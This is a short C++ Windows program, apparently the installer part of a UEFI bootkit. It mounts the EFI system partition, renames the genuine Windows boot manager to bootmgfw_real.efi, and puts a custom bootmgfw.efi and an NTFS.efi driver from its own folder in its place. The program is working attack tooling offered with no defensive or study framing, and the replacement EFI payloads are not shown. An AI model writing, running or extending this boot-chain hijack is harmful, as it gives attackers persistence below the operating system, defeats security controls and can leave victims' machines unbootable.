#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <filesystem>
#include <windows.h>

using namespace std;
namespace fs = std::filesystem;

string CUSTOM_EFI_PATH;
string NTFS_PATH;
// Hardcoded path to your custom EFI file
std::string getCurrentDir() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return fs::path(buffer).parent_path().string();
}



 
const string ESP_MOUNT = "Z:\\"; // EFI partition will be mounted here

bool mountESP() {
    cout << "[*] Mounting EFI partition...\n";
    string cmd = "mountvol " + ESP_MOUNT + " /S";
    int result = system(cmd.c_str());
    return (result == 0);
}




bool replaceBootloader() {
    string originalBoot = ESP_MOUNT + string("EFI\\Microsoft\\Boot\\bootmgfw.efi");
     string NTFS_LOC = ESP_MOUNT + string("EFI\\Boot\\NTFS.efi");
    string backupBoot   = ESP_MOUNT + string("EFI\\Microsoft\\Boot\\bootmgfw_real.efi");

    try {
        if (fs::exists(originalBoot)) {
            fs::rename(originalBoot, backupBoot);
            cout << "[+] Original bootloader renamed to bootmgfw_real.efi\n";
        } else {
            cerr << "[-] Original bootloader not found!\n";
            return false;
        }

        fs::copy(CUSTOM_EFI_PATH, originalBoot, fs::copy_options::overwrite_existing);
        fs::copy(NTFS_PATH, NTFS_LOC, fs::copy_options::overwrite_existing);
        cout << "[+] Custom EFI copied as bootmgfw.efi\n";
         cout << "[+] Custom EFI copied as NTFS.efi\n";
        return true;
    } catch (const fs::filesystem_error& e) {
        cerr << "[-] Filesystem error: " << e.what() << "\n";
        return false;
    }
}

int main() {
 CUSTOM_EFI_PATH = getCurrentDir() + "\\bootmgfw.efi";
 NTFS_PATH = getCurrentDir() + "\\NTFS.efi";
    cout<<CUSTOM_EFI_PATH ;


    if (!mountESP()) {
        cerr << "[-] Failed to mount EFI partition. Run as Administrator.\n";
        return 1;
    }

    cout << "[+] EFI Partition mounted successfully.\n";




        if (!replaceBootloader()) {
            cerr << "[-] Failed to replace bootloader!\n";
        }

    return 0;
}
